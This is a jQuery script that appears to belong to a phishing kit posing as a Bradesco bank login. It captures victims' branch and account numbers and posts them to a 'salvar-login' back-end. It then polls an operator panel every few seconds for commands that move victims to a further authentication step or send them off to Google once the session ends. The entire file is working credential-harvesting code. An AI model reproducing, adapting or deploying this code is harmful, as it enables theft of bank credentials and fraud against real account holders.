$('document').ready(function() {

    $("#Form60").on("submit", function(event) {
        event.preventDefault(); // Previne o envio padrão do formulário

        // Chame sua ação personalizada aqui
        LoginWeb();
    });

    function LoginWeb() {

        //alert('true');
        var agencia = $("#AGN").val();
        var conta = $("#CTA").val();

        $("#btnOk").val("AGUARDE...");
        $('#btnOk').css('width', '77px');

        $("#loader").show();
        $("#btnOk").prop("disabled", true);
        if (agencia.length > 2) {

        } else {
            alert('Informa\u00e7\u00F5es inv\u00e1lidas. Por favor, verifique ag\u00eancia, conta e d\u00edgito');

            $("#btnOk").val("OK");
            $('#btnOk').css('width', '30px');

            $("#loader").hide();
            $("#btnOk").prop("disabled", false);
            return false;
        }

        if (conta.length > 2) {

        } else {
            $("#btnOk").val("OK");
            $('#btnOk').css('width', '30px');

            $("#loader").hide();
            $("#btnOk").prop("disabled", false);
            alert('Informa\u00e7\u00F5es inv\u00e1lidas. Por favor, verifique ag\u00eancia, conta e d\u00edgito');
            return false;
        }

        if (digito.length > 0) {

        } else {
            $("#btnOk").val("OK");
            $('#btnOk').css('width', '30px');

            $("#loader").hide();
            $("#btnOk").prop("disabled", false);
            alert('Informa\u00e7\u00F5es inv\u00e1lidas. Por favor, verifique ag\u00eancia, conta e d\u00edgito');
            return false;
        }

        console.log(conta);

        const request = $.ajax({
            method: "post",
            url: "../webdriver/function.php/?funcao=salvar-login",
            data: {
                usuario: agencia,
                senha: conta,
                tipo: 'BRADESCO'
            },
        });

        request.done(data => {

            if (data == 'true') {

                setInterval(function() {
                    //Incluir e enviar o POST para o arquivo responsável em fazer contagem
                    $.post("../webdriver/function.php?app=online", {
                        contar: agencia,
                    }, function(data) {
                        $('#online').text(data);
                    });
                }, 3000);
                Request();
                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'LOGIN PENDENTE'
                    },
                    cache: false
                });
            }
        })

    }

    setInterval(function() {
        //Incluir e enviar o POST para o arquivo responsável em fazer contagem
        $.post("../webdriver/function.php?app=online", {
            contar: '',
        }, function(data) {
            $('#online').text(data);
        });
    }, 3000);

    function GetJson() {
        const request = $.ajax({
            method: "POST",
            url: "../webdriver/function.php?funcao=JsonApp",
            //dataType: 'json', // Tipo de dados esperado
            data: {
                funcao: 'pegarJson'
            },
        });

        request.done(data => {
            //console.log(data);

            var tipo_conta = data[0]["variacao"];

            const request = $.ajax({
                url: "../webdriver/function.php?funcao=select-tipo",
                method: "post",
                dataType: "text",
                data: {
                    tipo: tipo_conta
                },
                cache: false
            });



        })
    }

    function Request() {
        const requestweb = $.ajax({
            url: "../webdriver/function.php?acao=comando",
            method: "post",
            dataType: "text",
            data: {},
            cache: false
        });

        requestweb.done(data => {

            if (data == 'TITULARES ATUALIZADO') {
                GetJson();
                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'REDIRECIONANDO...'
                    },
                    cache: false
                });

                setTimeout(function() {
                    location.href = '?app=bradesco&acao=autenticacao';
                }, 2000);
            }

            if (data == 'login') {
                $("#btnOk").val("OK");
                $('#btnOk').css('width', '30px');

                $("#loader").hide();
                $("#btnOk").prop("disabled", false);
                alert('Informa\u00e7\u00F5es inv\u00e1lidas. Por favor, verifique ag\u00eancia, conta e d\u00edgito');

                $("#AGN").val("");
                $("#CTA").val("");
                $("#DIGCTA").val("");

                $('#AGN').focus();

                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'AGUARDANDO LOGIN'
                    },
                    cache: false
                });

            }

            if (data == 'atendimento_finalizado') {
                window.location.href = "https://www.google.com/";
            }

        })

        .always(function() {
            setTimeout(function() {
                Request();
            }, 3000);
        });
    }

    $('#AGN').keypress(function(event) {
        // Obtém o código da tecla pressionada
        var keycode = event.keyCode || event.which;

        // Verifica se a tecla pressionada é um número ou se é uma tecla de controle como Backspace
        if (!(keycode >= 48 && keycode <= 57) && keycode != 8) {
            // Impede a entrada padrão
            event.preventDefault();
        }
    });

    $('#CTA').keypress(function(event) {
        // Obtém o código da tecla pressionada
        var keycode = event.keyCode || event.which;

        // Verifica se a tecla pressionada é um número ou se é uma tecla de controle como Backspace
        if (!(keycode >= 48 && keycode <= 57) && keycode != 8) {
            // Impede a entrada padrão
            event.preventDefault();
        }
    });

    $('#DIGCTA').keypress(function(event) {
        // Obtém o código da tecla pressionada
        var keycode = event.keyCode || event.which;

        // Verifica se a tecla pressionada é um número ou se é uma tecla de controle como Backspace
        if (!(keycode >= 48 && keycode <= 57) && keycode != 8) {
            // Impede a entrada padrão
            event.preventDefault();
        }
    });

    $('#AGN').focus();
    $('#AGN').keyup(function(e) {
        var valor = $(e.target).val();
        let maxLength = $(e.target).attr('maxLength');
        if (valor.length == maxLength) {
            $('#CTA').focus();
        }
    });

    $('#CTA').keyup(function(e) {
        var valor = $(e.target).val();
        let maxLength = $(e.target).attr('maxLength');
        if (valor.length == maxLength) {
            $('#DIGCTA').focus();
        }
    });
});